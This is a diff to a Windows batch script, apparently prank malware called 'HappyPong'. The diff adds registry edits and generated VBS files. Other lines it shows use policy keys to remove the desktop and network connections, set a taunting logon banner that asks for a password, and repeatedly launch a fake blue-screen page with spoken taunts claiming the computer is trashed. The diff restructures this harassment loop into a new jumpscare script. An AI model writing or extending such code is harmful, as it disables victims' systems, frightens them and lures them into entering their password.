@@ -42,6 +42,8 @@ echo imgur.com >> note.txt
 echo icon-icons.com >> note.txt
 echo windows10forums.com >> note.txt
 echo en.wikiversity.org >> note.txt
+echo wix.com >> note.txt
+echo deviantart.com (Gaminglover) >> note.txt
 echo makeuseof.com >> note.txt
 echo tb.rg-adguard.net >> note.txt
 echo community.spiceworks.com >> note.txt
@@ -186,6 +188,7 @@ reg ADD HKCU\Software\Microsoft\Windows /v SearchboxTaskbarMode /t REG_DWORD /d 
 reg ADD HKCU\Software\Microsoft\Windows\DWM /v EnableAeroPeek /t REG_DWORD /d 0 /f
 reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v legalnoticecaption /t REG_SZ /d GET_READY_TO_BE_KISSED! /f
 reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v legalnoticetext /t REG_SZ /d I_ALWAYS_LOVE_YOU!!!_PRESS_OK_AND_ENTER_YOUR_PASSWORD_TO_BE_KISSED_MY_FRIEND!!!_ILOVEYOU!!!_SOS!!!1 /f
+reg ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Search\Flighting\1\SearchBoxText /v Value /t REG_SZ /d SAY_GOODBYE_TO_YOUR_COMPUTER! /f
 goto GoToTheBackrooms
 
 :GoToTheBackrooms
@@ -213,6 +216,7 @@ echo on error resume next >> shutdown.vbs
 echo Set WshShell = CreateObject ("wscript.shell") >> shutdown.vbs
 echo wscript.sleep 600000 >> shutdown.vbs
 echo WshShell.Run "explorer.bat" >> shutdown.vbs
+echo WshShell.Run "halloween2.vbs" >> shutdown.vbs
 echo wscript.sleep 5000 >> shutdown.vbs
 echo WshShell.Run "regret.vbs" >> shutdown.vbs
 echo wscript.sleep 10000 >> shutdown.vbs
@@ -337,6 +341,34 @@ echo sapi.Speak "A problem has been detected and windows has been suspended for 
 echo Dim sapi >> halloween2.vbs
 echo Set sapi=CreateObject("sapi.spvoice") >> halloween2.vbs
 echo sapi.Speak "Hey! I am super happy to tell you that your computer has been trashed by HappyPong! Malware Bytes will not help you! You just recieved a fake email from Daniel! Hehe get scammed noob!" >> halloween2.vbs
+goto TriggerUrMom
+
+:TriggerUrMom
+echo Set WshShell = CreateObject ("wscript.shell") >> jumpscare.vbs
+echo wscript.sleep 60000 >> jumpscare.vbs
+echo WshShell.Run "bsod.hta" >> jumpscare.vbs
+echo WshShell.Run "halloween1.vbs" >> jumpscare.vbs
+echo wscript.sleep 60000 >> jumpscare.vbs
+echo WshShell.Run "bsod.hta" >> jumpscare.vbs
+echo WshShell.Run "halloween1.vbs" >> jumpscare.vbs
+echo wscript.sleep 60000 >> jumpscare.vbs
+echo WshShell.Run "bsod.hta" >> jumpscare.vbs
+echo WshShell.Run "halloween1.vbs" >> jumpscare.vbs
+echo wscript.sleep 60000 >> jumpscare.vbs
+echo WshShell.Run "bsod.hta" >> jumpscare.vbs
+echo WshShell.Run "halloween1.vbs" >> jumpscare.vbs
+echo wscript.sleep 60000 >> jumpscare.vbs
+echo WshShell.Run "bsod.hta" >> jumpscare.vbs
+echo WshShell.Run "halloween1.vbs" >> jumpscare.vbs
+echo wscript.sleep 60000 >> jumpscare.vbs
+echo WshShell.Run "bsod.hta" >> jumpscare.vbs
+echo WshShell.Run "halloween1.vbs" >> jumpscare.vbs
+echo wscript.sleep 60000 >> jumpscare.vbs
+echo WshShell.Run "bsod.hta" >> jumpscare.vbs
+echo WshShell.Run "halloween1.vbs" >> jumpscare.vbs
+echo wscript.sleep 60000 >> jumpscare.vbs
+echo WshShell.Run "bsod.hta" >> jumpscare.vbs
+echo WshShell.Run "halloween1.vbs" >> jumpscare.vbs
 goto IAmGriffpatch
 
 :IAmGriffpatch
@@ -370,47 +402,8 @@ goto NoMoreInternet
 :NoMoreInternet
 reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoNetworkConnections /t REG_DWORD /d 1 /f 
 reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f
-ping -n 100 127.0.0.1>nul
 goto FreddyFazbearJumpscareGaveMeHeartAttack
 
 :FreddyFazbearJumpscareGaveMeHeartAttack
 cd C:\WINDOWS\HappyPong
-start bsod.hta
-start halloween1.vbs
-ping -n 10 127.0.0.1>nul
-taskkill /f /im mshta.exe
-ping -n 60 127.0.0.1>nul
-start bsod.hta
-start halloween1.vbs
-ping -n 10 127.0.0.1>nul
-taskkill /f /im mshta.exe
-ping -n 60 127.0.0.1>nul
-start bsod.hta
-start halloween1.vbs
-ping -n 10 127.0.0.1>nul
-taskkill /f /im mshta.exe
-ping -n 60 127.0.0.1>nul
-start bsod.hta
-start halloween1.vbs
-ping -n 10 127.0.0.1>nul
-taskkill /f /im mshta.exe
-ping -n 60 127.0.0.1>nul
-start bsod.hta
-start halloween1.vbs
-ping -n 10 127.0.0.1>nul
-taskkill /f /im mshta.exe
-ping -n 60 127.0.0.1>nul
-start bsod.hta
-start halloween1.vbs
-ping -n 10 127.0.0.1>nul
-taskkill /f /im mshta.exe
-ping -n 60 127.0.0.1>nul
-start bsod.hta
-start halloween1.vbs
-ping -n 10 127.0.0.1>nul
-taskkill /f /im mshta.exe
-ping -n 60 127.0.0.1>nul
-start bsod.hta
-start halloween1.vbs
-ping -n 10 127.0.0.1>nul
-taskkill /f /im mshta.exe
+start jumpscare.vbs
